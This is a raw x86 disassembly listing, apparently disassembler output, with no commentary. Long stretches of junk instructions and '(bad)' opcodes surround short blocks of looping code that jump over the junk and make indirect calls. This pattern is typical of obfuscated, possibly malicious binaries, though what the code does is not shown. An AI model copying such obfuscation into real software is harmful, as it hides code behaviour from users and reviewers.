  403c06:	pop    ebx
  403c07:	retf   
  403c08:	sub    eax,0xde80709b
  403c0d:	rcl    BYTE PTR [edi+0x36161b22],1
  403c13:	shl    BYTE PTR [ebp-0x14bd17bb],0x2e
  403c1a:	stos   DWORD PTR es:[edi],eax
  403c1b:	std    
  403c1c:	fdivr  DWORD PTR [edx-0x314fcea6]
  403c22:	aas    
  403c23:	add    WORD PTR [edx],bp
  403c26:	lea    edi,[eax+0x68]
  403c29:	or     BYTE PTR [ebx],cl
  403c2b:	int3   
  403c2c:	pop    edi
  403c2d:	(bad)  
  403c2e:	dec    edi
  403c2f:	out    dx,eax
  403c30:	sub    BYTE PTR [edi+0x4ad5146f],ah
  403c36:	outs   dx,BYTE PTR ds:[esi]
  403c37:	fisttp QWORD PTR [esi]
  403c39:	mov    ds:0x701430a7,eax
  403c3e:	mov    ds:0x4540752d,al
  403c43:	sbb    eax,0x5159eb62
  403c48:	ds call 0x67508f1
  403c4e:	cdq    
  403c4f:	jg     0x403bed
  403c51:	pmaxsw mm7,QWORD PTR ds:[edi-0x16]
  403c56:	sub    bl,BYTE PTR ds:0x47a3273d
  403c5c:	in     al,dx
  403c5d:	dec    eax
  403c5e:	ret    
  403c5f:	fs push es
  403c61:	imul   ecx,ecx,0x53
  403c64:	add    al,0x2e
  403c66:	or     DWORD PTR [eax-0x1072281f],ebp
  403c6c:	adc    BYTE PTR [ebx],0x5c
  403c6f:	bnd jg 0x403c44
  403c72:	cmc    
  403c73:	into   
  403c74:	pop    DWORD PTR [edi-0x7d15c6b5]
  403c7a:	test   dl,0xfe
  403c7d:	sbb    edx,0xd8a982f9
  403c83:	jns    0x403cf0
  403c85:	inc    ebp
  403c86:	ret    0xbc0
  403c89:	jl     0x403cd7
  403c8b:	push   esp
  403c8c:	dec    edx
  403c8d:	jecxz  0x403c82
  403c8f:	imul   esp,DWORD PTR [ebp-0x143c2fd9],0xe462837a
  403c99:	cli    
  403c9a:	add    ebp,DWORD PTR [ebp+0x4f9f65e7]
  403ca0:	push   es
  403ca1:	(bad)  
  403ca2:	shl    DWORD PTR [eax+0x45],1
  403ca5:	cmp    al,0xa2
  403ca7:	clc    
  403ca8:	mov    al,0xe2
  403caa:	mov    edx,0xf02cbbeb
  403caf:	or     al,0xcf
  403cb1:	mov    dh,BYTE PTR [ebx+eax*1+0x3a27314b]
  403cb8:	xchg   ebp,eax
  403cb9:	ret    
  403cba:	xor    al,0xb2
  403cbc:	loop   0x403c4e
  403cbe:	xor    eax,0x56f01f96
  403cc3:	xor    al,0x46
  403cc5:	pop    ecx
  403cc6:	gs (bad) 
  403cc8:	(bad)  [ecx-0x1aea4c9f]
  403cce:	jo     0x403c89
  403cd0:	jmp    0x403ccf
  403cd2:	jns    0x403ce5
  403cd4:	shl    BYTE PTR [ecx+0x1c],1
  403cd7:	pop    edi
  403cd8:	scas   al,BYTE PTR es:[edi]
  403cd9:	push   0x51
  403cdb:	inc    ecx
  403cdc:	adc    DWORD PTR [ebx+0x519dd545],ecx
  403ce2:	ret    0x128b
  403ce5:	imul   ebp,DWORD PTR ds:0xe9d1d8af,0x40
  403cec:	inc    eax
  403ced:	sbb    DWORD PTR [esi+eax*1-0x1853780d],esp
  403cf4:	push   ebx
  403cf5:	add    DWORD PTR [esi+0x2d9ad1aa],ebx
  403cfb:	gs out dx,eax
  403cfd:	loopne 0x403cd3
  403cff:	addr16 jnp 0x403d0c
  403d02:	lods   al,BYTE PTR gs:[esi]
  403d04:	and    DWORD PTR [edx],ebp
  403d06:	sbb    ch,bl
  403d08:	icebp  
  403d09:	mov    dh,0xaa
  403d0b:	in     eax,0x28
  403d0d:	arpl   WORD PTR [edx],di
  403d0f:	pop    ebx
  403d10:	leave  
  403d11:	ins    BYTE PTR es:[edi],dx
  403d12:	add    edx,ecx
  403d14:	and    DWORD PTR ds:0x424855,0x0
  403d1e:	mov    ebx,DWORD PTR ds:0x424855
  403d24:	inc    ebx
  403d25:	mov    DWORD PTR ds:0x424855,ebx
  403d2b:	cmp    DWORD PTR ds:0x424855,0x1a
  403d32:	jne    0x403d41
  403d38:	push   DWORD PTR [ebp-0xc]
  403d3b:	call   DWORD PTR ds:0x44200c
  403d41:	cmp    DWORD PTR ds:0x424855,0x12
  403d48:	jb     0x403d1e
  403d4e:	add    ebx,DWORD PTR ds:0x44798c
  403d54:	imul   edx,edi
  403d57:	mov    edi,DWORD PTR [ebp-0x8]
  403d5a:	mov    ebx,DWORD PTR [ebp-0x10]
  403d5d:	sbb    DWORD PTR ds:0x44a6e0,0x3f1a
  403d67:	sub    ebx,edi
  403d69:	cmp    ebx,edx
  403d6b:	ja     0x403d93
  403d71:	add    edx,DWORD PTR ds:0x41074b
  403d77:	mov    edx,DWORD PTR [ebp-0x4]
  403d7a:	xor    edx,eax
  403d7c:	not    DWORD PTR ds:0x44d40c
  403d82:	add    edx,ecx
  403d84:	mov    DWORD PTR ds:0x44d418,0x3a6f
  403d8e:	jmp    0x4047a2
  403d93:	movzx  ebx,WORD PTR ds:0x44a6d4
  403d9a:	or     DWORD PTR ds:0x447990,ebx
  403da0:	mov    edx,DWORD PTR [ebp-0x2c]
  403da3:	mov    DWORD PTR ds:0x447994,0x16
  403dad:	cmp    DWORD PTR ds:0x447994,0x0
  403db4:	je     0x403e6e
  403dba:	cmp    DWORD PTR ds:0x447994,0x20
  403dc1:	jne    0x403dd5
  403dc7:	push   DWORD PTR [ebp-0x18]
  403dca:	push   0x4107a9
  403dcf:	call   DWORD PTR ds:0x44235c
  403dd5:	mov    ebx,DWORD PTR ds:0x447994
  403ddb:	dec    ebx
  403ddc:	mov    DWORD PTR ds:0x447994,ebx
  403de2:	jmp    0x403dad
  403de7:	and    DWORD PTR ds:0x424851,0x0
  403df1:	jmp    0x403e03
  403df6:	mov    ebx,DWORD PTR ds:0x424851
  403dfc:	inc    ebx
  403dfd:	mov    DWORD PTR ds:0x424851,ebx
  403e03:	cmp    DWORD PTR ds:0x424851,0x1c
  403e0a:	jae    0x403e6e
  403e10:	cmp    DWORD PTR ds:0x424851,0xc
  403e17:	jne    0x403e4f
  403e1d:	push   DWORD PTR [ebp-0x10]
  403e20:	push   0x1816
  403e25:	push   DWORD PTR [ebp-0x28]
  403e28:	push   0x7e95
  403e2d:	push   0x4109
  403e32:	push   0x336d
  403e37:	push   0x1411
  403e3c:	push   DWORD PTR [ebp-0x20]
  403e3f:	push   0x7b8b
  403e44:	push   0x3268
  403e49:	call   DWORD PTR ds:0x4420d8
  403e4f:	cmp    DWORD PTR ds:0x424851,0xb
  403e56:	jne    0x403e69
  403e5c:	mov    ebx,DWORD PTR ds:0x424851
  403e62:	inc    ebx
  403e63:	mov    DWORD PTR ds:0x424851,ebx
  403e69:	jmp    0x403df6
  403e6e:	mov    edi,DWORD PTR [ebp-0x4]
  403e71:	xor    edx,eax
  403e73:	xor    edi,eax
  403e75:	add    edi,ecx
  403e77:	add    edx,ecx
  403e79:	imul   edx,edi
  403e7c:	mov    edi,DWORD PTR [ebp-0x8]
  403e7f:	mov    ebx,DWORD PTR [ebp-0x10]
  403e82:	sub    ebx,edi
  403e84:	cmp    ebx,edx
  403e86:	ja     0x403e94
  403e8c:	mov    edx,DWORD PTR [ebp-0x28]
  403e8f:	jmp    0x40462f
  403e94:	mov    edx,DWORD PTR [ebp-0x30]
  403e97:	mov    edi,DWORD PTR [ebp-0x4]
  403e9a:	jmp    0x403fff
  403e9f:	dec    ebp
  403ea0:	xchg   esp,eax
  403ea1:	(bad)  
  403ea2:	call   0xa99e390c
  403ea7:	sub    ah,ah
  403ea9:	adc    al,0xc3
  403eab:	ins    DWORD PTR es:[edi],dx
  403eac:	or     BYTE PTR [ebx+0x7c195eb0],ah
  403eb2:	jl     0x403ee8
  403eb4:	jg     0x403f32
  403eb6:	jl     0x403f06
  403eb8:	pop    edi
  403eb9:	hlt    
  403eba:	inc    esi
  403ebb:	pop    ebp
  403ebc:	bound  ebp,QWORD PTR [edx]
  403ebe:	pop    edx
  403ebf:	call   0xfae6:0x1f443228
  403ec6:	stos   BYTE PTR es:[edi],al
  403ec7:	int    0x58
  403ec9:	sub    eax,0x6c7f8930
  403ece:	pop    ebx
  403ecf:	ror    BYTE PTR [edx-0x63db8b22],1
  403ed5:	cmp    esi,DWORD PTR [edx]
  403ed7:	mov    bh,BYTE PTR [edi]
  403ed9:	pop    edi
  403eda:	xor    eax,0x2380a2ee
  403edf:	dec    edx
  403ee0:	jp     0x403f29
  403ee2:	aam    0x6b
  403ee4:	lock sbb al,0x65
  403ee7:	out    dx,al
  403ee8:	imul   esp,DWORD PTR cs:[edi+ebx*2+0x36],0x3d
  403eee:	dec    eax
  403eef:	nop
  403ef0:	cmp    eax,0x8df77ab0
  403ef5:	pusha  
  403ef6:	push   ds
  403ef7:	je     0x403f47
  403ef9:	div    BYTE PTR [esi+ebp*4+0x75]
  403efd:	push   ebp
  403efe:	pushf  
  403eff:	adc    eax,0x14ea0f17
  403f04:	fbld   TBYTE PTR [eax-0x58]
  403f07:	stos   BYTE PTR es:[edi],al
  403f08:	ret    
  403f09:	sti    
  403f0a:	mov    esi,0x8a52a8a3
  403f0f:	stos   BYTE PTR es:[edi],al
  403f10:	jbe    0x403ef6
  403f12:	sbb    al,0x3
  403f14:	stos   BYTE PTR es:[edi],al
  403f15:	shr    DWORD PTR [esi+0x69ce07f1],0x15
  403f1c:	mov    dl,dh
  403f1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f1f:	sbb    edi,DWORD PTR [eax-0x10]
  403f22:	adc    edx,eax
  403f24:	xchg   ebx,eax
  403f25:	xchg   ecx,eax
  403f26:	loop   0x403f3c
  403f28:	mov    esi,ebx
  403f2a:	jmp    0xe96f:0x111523e2
  403f31:	dec    esp
  403f32:	adc    DWORD PTR [edx],edx
  403f34:	pop    esp
  403f35:	test   al,0x69
  403f37:	inc    esi
  403f38:	js     0x403f45
  403f3a:	rol    DWORD PTR [ebx+0x2e],1
  403f3d:	mov    edx,0x9984cf46
  403f42:	jmp    0xa3d1:0x9a3ace86
  403f49:	xchg   esp,eax
  403f4a:	sbb    ebx,DWORD PTR [esi+ecx*2]
  403f4d:	pandn  mm0,QWORD PTR [ecx]
  403f50:	(bad)  
  403f51:	dec    edi
  403f52:	mov    dl,bh
  403f54:	hlt    
  403f55:	mov    bh,dl
  403f57:	pop    ecx
  403f58:	inc    eax
  403f59:	sbb    edx,DWORD PTR [ecx]
  403f5b:	add    BYTE PTR [esi-0x6b],bh
  403f5e:	loope  0x403ef4
  403f60:	and    edx,esi
  403f62:	lahf   
  403f63:	fdivr  DWORD PTR [ecx+0x4b5b4c1b]
  403f69:	sbb    DWORD PTR [esi],ebx
  403f6b:	jp     0x403f99
  403f6d:	sub    al,0x19
  403f6f:	sti    
  403f70:	cmp    ebp,eax
  403f72:	addr16 push esp
  403f74:	std    
  403f75:	mov    ebx,0x5c6126ad
  403f7a:	push   edi
  403f7b:	repnz lahf 
  403f7d:	test   BYTE PTR [ebp-0x52e96c35],al
  403f83:	inc    ebp
  403f84:	daa    
  403f85:	inc    ebp
  403f86:	mov    DWORD PTR [edx],edx
  403f88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f89:	pop    edx
  403f8a:	into   
  403f8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f8c:	lock fidivr DWORD PTR [eax+0x1d]
  403f90:	or     DWORD PTR [edx],ecx
  403f92:	out    dx,al
  403f93:	inc    ecx
  403f94:	mov    ebp,DWORD PTR [ebx-0x50c6667a]
  403f9a:	sbb    DWORD PTR [ebx-0x67afe359],0xffffffb1
  403fa1:	xor    al,BYTE PTR [esi+0x3c]
  403fa4:	stos   DWORD PTR es:[edi],eax
  403fa5:	call   FWORD PTR [esi+0xc9875a0]
  403fab:	in     eax,dx
  403fac:	(bad)  
  403fad:	rcr    DWORD PTR [ebp+edx*1-0x5890b75a],1
  403fb4:	add    BYTE PTR [ebx+0x70],0x4
  403fb8:	jecxz  0x403fbf
  403fba:	xlat   BYTE PTR ds:[ebx]
  403fbb:	dec    edx
  403fbc:	mov    esp,0xaf16b3d
  403fc1:	shl    DWORD PTR [edi],cl
  403fc3:	add    eax,0xbff1b1c7
  403fc8:	cmp    BYTE PTR [edi+0x2],0xb9
  403fcc:	or     bh,al
  403fce:	ja     0x403fdd
  403fd0:	daa    
  403fd1:	jecxz  0x403fb4
  403fd3:	or     bl,BYTE PTR [esp+ebp*1]
  403fd6:	daa    
  403fd7:	pusha  
  403fd8:	push   es
  403fd9:	popa   
  403fda:	pop    edx
  403fdb:	sbb    BYTE PTR [bx+di],0xf4
  403fdf:	jbe    0x404052
  403fe1:	call   FWORD PTR [eax+0x6ea82b90]
  403fe7:	aaa    
  403fe8:	lea    ebx,[ebx+esi*1+0xe]
  403fec:	mov    ebp,0xcb2bc08b
  403ff1:	pop    ds
  403ff2:	test   DWORD PTR [esi],edi
  403ff4:	icebp  
  403ff5:	daa    
  403ff6:	xchg   ebx,eax
  403ff7:	(bad)  
  403ff8:	ins    DWORD PTR es:[edi],dx
  403ff9:	inc    DWORD PTR [ebx]
  403ffb:	xlat   BYTE PTR ds:[ebx]
  403ffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ffd:	lods   eax,DWORD PTR ds:[esi]
  403ffe:	mov    al,ds:0xf833d033
  404003:	add    edi,ecx
  404005:	add    edx,ecx
  404007:	imul   edx,edi
  40400a:	mov    edi,DWORD PTR [ebp-0x8]
  40400d:	mov    ebx,DWORD PTR [ebp-0x10]
  404010:	sub    ebx,edi
  404012:	cmp    ebx,edx
  404014:	ja     0x404022
  40401a:	mov    edx,DWORD PTR [ebp-0x2c]
  40401d:	jmp    0x40462f
  404022:	mov    edx,DWORD PTR [ebp-0x34]
  404025:	mov    edi,DWORD PTR [ebp-0x4]
  404028:	xor    edx,eax
  40402a:	xor    edi,eax
  40402c:	add    edi,ecx
  40402e:	add    edx,ecx
  404030:	imul   edx,edi
  404033:	mov    edi,DWORD PTR [ebp-0x8]
  404036:	mov    ebx,DWORD PTR [ebp-0x10]
  404039:	sub    ebx,edi
  40403b:	cmp    ebx,edx
  40403d:	jmp    0x4041a2
  404042:	sbb    DWORD PTR [edx+ecx*2],esi
  404045:	cs pop ebp
  404047:	mov    ds:0xe1ed77d,al
  40404c:	cmovae edi,DWORD PTR [edi+0x1643e686]
  404053:	sbb    edi,DWORD PTR [esp+edi*2+0x34]
  404057:	jg     0x4040d5
  404059:	jl     0x404082
  40405b:	rcl    DWORD PTR [esi+ebx*4-0x37943d1f],0x64
  404063:	inc    esp
  404064:	inc    BYTE PTR [ebp+edi*4+0x282ad224]
  40406b:	lods   eax,DWORD PTR ds:[esi]
  40406c:	jo     0x404026
  40406e:	xor    al,0x65
  404070:	fcomi  st,st(1)
  404072:	ret    
  404073:	pop    ecx
  404074:	jo     0x404024
  404076:	adc    ebx,DWORD PTR [edx+0x66b50669]
  40407c:	mov    al,ds:0x5ce7ca2b
  404081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404082:	cmp    ch,bl
  404084:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404085:	jmp    0xe12a:0x694acd39
  40408c:	push   0xffffffed
  40408e:	inc    edi
  40408f:	xor    al,BYTE PTR [ebx-0x44ce4b3b]
  404095:	mov    ebp,0xf7326caf
  40409a:	mov    ebx,0xfc2807de
  40409f:	dec    esi
  4040a0:	adc    bl,BYTE PTR [edx-0x2dc02c68]
  4040a6:	or     ah,BYTE PTR [esi]
  4040a8:	paddusw mm0,QWORD PTR [ecx-0x7b]
  4040ac:	shl    DWORD PTR [eax],1
  4040ae:	jle    0x4040fd
  4040b0:	lods   eax,DWORD PTR ds:[esi]
  4040b1:	pop    esp
  4040b2:	popf   
  4040b3:	add    al,BYTE PTR [edx]
  4040b5:	pop    edx
  4040b6:	fld    QWORD PTR [ecx]
  4040b8:	dec    edx
  4040b9:	and    al,0xa0
  4040bb:	std    
  4040bc:	and    eax,0x7c978c88
  4040c1:	popf   
  4040c2:	xchg   edx,eax
  4040c3:	xlat   BYTE PTR ds:[ebx]
  4040c4:	mov    esi,0x5979e387
  4040c9:	pop    edi
  4040ca:	scas   al,BYTE PTR es:[edi]
  4040cb:	push   ebp
  4040cc:	popf   
  4040cd:	mov    al,0x30
  4040cf:	mov    ebx,0xa0da2d96
  4040d4:	mov    ecx,DWORD PTR es:0xa2b46d2d
  4040db:	mov    ah,0x6b
  4040dd:	cmp    ebx,edx
  4040df:	(bad)  
  4040e0:	sbb    eax,0x5f82b970
  4040e5:	fadd   DWORD PTR ds:0xc76278af
  4040eb:	add    esi,esi
  4040ed:	ficom  DWORD PTR cs:[edx+esi*4-0x12e4bf50]
  4040f5:	fcomp  DWORD PTR [eax-0x1b]
  4040f8:	or     ebp,DWORD PTR [ebp+0x1759199a]
  4040fe:	jmp    0x404093
  404100:	and    eax,0xd2efaba6
  404105:	retf   
  404106:	dec    ebp
  404107:	rcr    dh,cl
  404109:	or     DWORD PTR [eax+0x78],0xe053a152
  404110:	pop    es
  404111:	cmp    ebp,ecx
  404113:	aas    
  404114:	fidivr DWORD PTR [ebx]
  404116:	mov    bh,0xd1
  404118:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404119:	rol    eax,0x6b
  40411c:	out    dx,al
  40411d:	xchg   esi,eax
  40411e:	fs pop es
  404120:	fwait
  404121:	int    0xc3
  404123:	in     al,0xbd
  404125:	add    cl,0x68
  404128:	inc    edi
  404129:	(bad)  
  40412a:	dec    esp
  40412b:	(bad)  
  40412c:	leave  
  40412d:	(bad)  
  40412f:	test   DWORD PTR [ebx],esi
  404131:	das    
  404132:	pop    ss
  404133:	pusha  
  404134:	or     BYTE PTR [ecx+0x5a2f44a2],bh
  40413a:	adc    eax,DWORD PTR [edx+ebp*2+0x35]
  40413e:	je     0x404126
  404140:	out    0xb8,eax
  404142:	das    
  404143:	ret    
  404144:	aas    
  404145:	loopne 0x4041b8
  404147:	dec    esi
  404148:	jo     0x4041b9
  40414a:	sar    DWORD PTR [edi-0x6c4c56de],cl
  404150:	aaa    
  404151:	call   DWORD PTR [edi]
  404153:	iret   
  404154:	es push ecx
  404156:	dec    eax
  404157:	cld    
  404158:	js     0x404115
  40415a:	mov    ecx,0x21ab9a23
  40415f:	push   esi
  404160:	test   ebp,esp
  404162:	jle    0x4041a8
  404164:	sbb    esi,DWORD PTR [edx-0x5848dd24]
  40416a:	xor    BYTE PTR [ecx],al
  40416c:	dec    edi
  40416d:	xor    al,0xb
  40416f:	shr    dh,1
  404171:	pop    ds
  404172:	out    0xd,eax
  404174:	and    BYTE PTR [ecx+0x5c],cl
  404177:	xchg   ebp,eax
  404178:	adc    ah,0x66
  40417b:	leave  
  40417c:	mov    ebp,0x5afda485
  404181:	fwait
  404182:	mov    ds:0x5a62381d,eax
  404187:	add    eax,0xcb30dd72
  40418c:	inc    edi
  40418d:	ja     0x4041b2
  40418f:	jmp    0xc9cb378c
  404194:	out    0xae,eax
  404196:	scas   al,BYTE PTR es:[edi]
  404197:	or     eax,0xe28baa3e
  40419c:	and    eax,0x687c44e
  4041a1:	or     DWORD PTR [edi],0xffffff87
  4041a4:	or     BYTE PTR [eax],al
  4041a6:	add    BYTE PTR [eax],al
  4041a8:	mov    edx,DWORD PTR [ebp-0x30]
  4041ab:	jmp    0x40462f
  4041b0:	mov    edx,DWORD PTR [ebp-0x38]
  4041b3:	mov    edi,DWORD PTR [ebp-0x4]
  4041b6:	xor    edx,eax
  4041b8:	xor    edi,eax
  4041ba:	jmp    0x40431f
  4041bf:	dec    ecx
  4041c0:	inc    ebx
  4041c1:	fdivr  st,st(0)
  4041c3:	fidivr DWORD PTR [ebx+0x69]
  4041c6:	gs jge 0x40418a
  4041c9:	shr    ebx,cl
  4041cb:	ins    BYTE PTR es:[edi],dx
  4041cc:	fcmovnu st,st(2)
  4041ce:	xor    ch,dh
  4041d0:	sbb    bh,BYTE PTR [esp+edi*2+0x34]
  4041d4:	jg     0x404252
  4041d6:	jl     0x404242
  4041d8:	push   ss
  4041d9:	test   BYTE PTR [ebp+ebp*4-0x31aec20d],0x7
  4041e1:	data16 rol BYTE PTR [ebx],cl
  4041e4:	lea    edx,[eax]
  4041e6:	jl     0x404242
  4041e8:	jns    0x4041e9
  4041ea:	mov    cl,0x96
  4041ec:	ret    
  4041ed:	adc    al,ch
  4041ef:	add    dl,dl
  4041f1:	out    dx,al
  4041f2:	xchg   esi,eax
  4041f3:	pusha  
  4041f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041f5:	xchg   BYTE PTR [ecx],bh
  4041f7:	fnstsw WORD PTR [edi-0x79]
  4041fa:	mov    fs,WORD PTR [ecx-0x5e]
  4041fd:	sbb    eax,0x80a74302
  404202:	loop   0x4041ab
  404204:	mov    dl,0x40
  404206:	data16 aad 0xbc
  404209:	sub    DWORD PTR [esi+0x88196cf],ebx
  40420f:	sub    eax,DWORD PTR [esi-0x76]
  404212:	dec    edi
  404213:	rcr    BYTE PTR [esi],0x3b
  404216:	pop    ebp
  404217:	jnp    0x40425d
  404219:	jmp    0xef5a0508
  40421e:	dec    esp
  40421f:	pop    ebx
  404220:	mov    al,ds:0x6ec26440
  404225:	test   DWORD PTR [ebp+0x29],edx
  404228:	sub    BYTE PTR [ecx+0x4e],0x59
  40422c:	(bad)  
  40422d:	jmp    0x9604:0x4646ddac
  404234:	mov    ch,0xd5
  404236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404237:	or     esi,eax
  404239:	nop
  40423a:	fist   DWORD PTR [edi+0x12]
  40423d:	cmp    al,0x78
  40423f:	mov    ds:0x266de644,al
  404244:	(bad)  
  404245:	cdq    
  404246:	dec    ecx
  404247:	add    eax,0xfbb05706
  40424c:	or     DWORD PTR [ecx+0x770a894e],ebx
  404252:	lea    ebx,[ecx]
  404254:	sub    eax,esi
  404256:	push   0x1175e9ee
  40425b:	fadd   QWORD PTR [esi+edx*8]
  40425e:	push   es
  40425f:	mov    eax,0x2978c4c1
  404264:	mov    eax,ds:0xe4beda75
  404269:	and    BYTE PTR [edx+0x38bd365],dl
  40426f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404270:	xchg   DWORD PTR [esi+esi*1],ecx
  404273:	dec    edi
  404274:	std    
  404275:	imul   ebp,DWORD PTR [edi-0x1a51c462],0x1cd80305
  40427f:	cmp    BYTE PTR [ebx],dl
  404281:	add    eax,0xb293e74f
  404286:	jo     0x40429c
  404288:	iret   
  404289:	xor    al,0x1a
  40428b:	mov    ch,0x87
  40428d:	pop    es
  40428e:	mov    ah,0xcf
  404290:	imul   ecx,DWORD PTR ss:[esi],0x8ceacb3b
  404297:	leave  
  404298:	jmp    FWORD PTR [ecx-0xf]
  40429b:	leave  
  40429c:	pop    ebx
  40429d:	mov    dl,0x89
  40429f:	push   cs
  4042a0:	jmp    0x404311
  4042a2:	jmp    0x40425f
  4042a4:	(bad)  
  4042a5:	mov    dh,0x9e
  4042a7:	sub    edx,DWORD PTR [ebp+0x94e2c96]
  4042ad:	mov    al,ds:0x70636060
  4042b2:	push   ss
  4042b3:	loope  0x404300
  4042b5:	fucomi st,st(4)
  4042b7:	icebp  
  4042b8:	rol    BYTE PTR [esi-0x6b],cl
  4042bb:	sbb    bh,BYTE PTR [ebp+0x5158af29]
  4042c1:	fs cmc 
  4042c3:	add    BYTE PTR [eax+eax*2+0xd],cl
  4042c7:	xchg   ecx,eax
  4042c8:	adc    DWORD PTR [edi],edi
  4042ca:	push   esp
  4042cb:	push   ebx
  4042cc:	cwde   
  4042cd:	adc    ax,0x5d3b
  4042d1:	and    DWORD PTR [ebp+0x3d],eax
  4042d4:	sbb    cl,ah
  4042d6:	and    al,0x7e
  4042d8:	and    cl,BYTE PTR cs:[edx-0x6be3d9b0]
  4042df:	cmc    
  4042e0:	add    BYTE PTR [edi+ebp*8],0x47
  4042e4:	xor    ch,dl
  4042e6:	add    dl,BYTE PTR [ebx+ebp*2-0x4f191f1]
  4042ed:	imul   esi,ebp,0x45
  4042f0:	mov    edx,0xa24840d3
  4042f5:	(bad)  
  4042f6:	mov    dl,ch
  4042f8:	mov    dh,0x28
  4042fa:	add    DWORD PTR [eax+0xfd99e91],eax
  404300:	cmp    BYTE PTR [edi+0x33a24993],bl
  404306:	xchg   edx,eax
  404307:	add    al,0x39
  404309:	cld    
  40430a:	jne    0x40433b
  40430c:	dec    esp
  40430d:	gs call 0x184bcda2
  404313:	jno    0x404343
  404315:	jbe    0x404297
  404317:	jge    0x40429f
  404319:	sbb    BYTE PTR [ebx],ch
  40431b:	adc    dl,BYTE PTR [ecx]
  40431d:	and    ebx,DWORD PTR [ebx+0x3]
  404320:	stc    
  404321:	add    edx,ecx
  404323:	imul   edx,edi
  404326:	mov    edi,DWORD PTR [ebp-0x8]
  404329:	jmp    0x40448e
  40432e:	fwait
  40432f:	bound  esp,QWORD PTR [edi]
  404331:	pushf  
  404332:	stc    
  404333:	ins    DWORD PTR es:[edi],dx
  404334:	fwait
  404335:	jge    0x4042bf
  404337:	les    ecx,FWORD PTR [ebp+0x29]
  40433a:	pop    ebx
  40433b:	and    ah,BYTE PTR [esi]
  40433d:	out    0xa6,eax
  40433f:	sbb    eax,0x7f347c7c
  404344:	jl     0x4043c2
  404346:	outs   dx,BYTE PTR ds:[esi]
  404347:	cmp    ah,BYTE PTR [ebx-0x6b]
  40434a:	pop    eax
  40434b:	sbb    dl,BYTE PTR [ebp+0x1ded07e3]
  404351:	xchg   edx,eax
  404352:	sbb    BYTE PTR [ebx-0x2d],ch
  404355:	jmp    0xf7a5910a
  40435a:	mov    esi,0x792e674e
  40435f:	inc    edx
  404360:	add    DWORD PTR [edx],edx
  404362:	sbb    al,BYTE PTR [edi+0x4a503fbd]
  404368:	inc    ebp
  404369:	or     DWORD PTR [edi-0x68],edi
  40436c:	pop    ebx
  40436d:	or     edi,DWORD PTR [ecx+0x4a]
  404370:	test   al,0x5c
  404372:	and    eax,0x3a6c4b50
  404377:	imul   BYTE PTR [ebp+0x5c7d8e60]
  40437d:	nop
  40437e:	aam    0xe9
  404380:	add    ecx,DWORD PTR [eax]
  404382:	and    cl,BYTE PTR [esi-0x61]
  404385:	je     0x404371
  404387:	xchg   ebp,eax
  404388:	fist   WORD PTR [edx-0x73]
  40438b:	add    ah,0xcc
  40438e:	xchg   DWORD PTR [edx-0x2],esi
  404391:	sar    DWORD PTR [edx+0x11c96e66],0xcd
  404398:	jmp    0xe23d:0xd5b7b95c
  40439f:	in     eax,dx
  4043a0:	stc    
  4043a1:	shl    DWORD PTR [eax-0x78],0x1a
  4043a5:	jnp    0x40439a
  4043a7:	(bad)  
  4043a8:	adc    edi,esi
  4043aa:	inc    edi
  4043ab:	mov    esp,DWORD PTR [edi]
  4043ad:	or     eax,0x90b05b07
  4043b2:	and    bl,BYTE PTR [ecx-0x56c30e65]
  4043b8:	push   edx
  4043b9:	dec    edx
  4043ba:	out    0x20,al
  4043bc:	das    
  4043bd:	sbb    al,BYTE PTR [ebp-0x74]
  4043c0:	push   edi
  4043c1:	fs cmp al,0x93
  4043c4:	pop    ebx
  4043c5:	sbb    esp,ecx
  4043c7:	pop    ebp
  4043c8:	xor    eax,0x352101ae
  4043cd:	adc    BYTE PTR [edi],0x7
  4043d0:	mov    al,ds:0xfb7e5e75
  4043d5:	add    ecx,DWORD PTR [ecx]
  4043d7:	mov    eax,0xd45d0b8b
  4043dc:	mov    cl,0x3f
  4043de:	int3   
  4043df:	xchg   BYTE PTR [ebx+0x5],bh
  4043e2:	bt     ebp,edi
  4043e5:	push   ss
  4043e6:	inc    esp
  4043e7:	ja     0x404443
  4043e9:	pop    esp
  4043ea:	mov    dh,0xd5
  4043ec:	es dec esi
  4043ee:	in     eax,dx
  4043ef:	stos   DWORD PTR es:[edi],eax
  4043f0:	sub    al,0xd4
  4043f2:	sub    al,0xcf
  4043f4:	sbb    ebx,esi
  4043f6:	arpl   WORD PTR [esp+esi*8],di
  4043f9:	xchg   esi,eax
  4043fa:	xchg   ebx,eax
  4043fb:	int    0x42
  4043fd:	mov    edx,0x47db230e
  404402:	jge    0x404481
  404404:	inc    ebx
  404405:	jle    0x404459
  404407:	push   ecx
  404408:	push   ss
  404409:	xchg   ebp,eax
  40440a:	mov    BYTE PTR [esi+0x69],dh
  40440d:	mov    esi,0x664ddd88
  404412:	push   ebx
  404413:	push   esp
  404414:	loop   0x404459
  404416:	pop    edx
  404417:	inc    esi
  404418:	or     bh,dl
  40441a:	lods   al,BYTE PTR ds:[esi]
  40441b:	imul   ebp,DWORD PTR [ebx],0x4a
  40441e:	xor    ah,BYTE PTR [edx+0x3337aa2a]
  404424:	mov    edi,0x801ee6c9
  404429:	aad    0xc5
  40442b:	push   edx
  40442c:	bswap  ecx
  40442e:	ja     0x40443e
  404430:	imul   edx,DWORD PTR [eax],0x7c
  404433:	cmp    al,0xc2
  404435:	and    DWORD PTR [eax-0x5e],0xdc4b01ed
  40443c:	xchg   ebp,eax
  40443d:	xchg   DWORD PTR ds:0xa333a4aa,esi
  404443:	scas   al,BYTE PTR es:[edi]
  404444:	inc    esp
  404445:	sti    
  404446:	lods   eax,DWORD PTR ds:[esi]
  404447:	retf   
  404448:	add    bh,al
  40444a:	(bad)  
  40444b:	scas   eax,DWORD PTR es:[edi]
  40444c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40444d:	pop    edx
  40444e:	jb     0x4043e9
  404450:	sbb    eax,0x9bb3a5b5
  404455:	mov    edx,0x91339950
  40445a:	(bad)  
  40445b:	call   0x2e56e7e0
  404460:	sbb    al,0x66
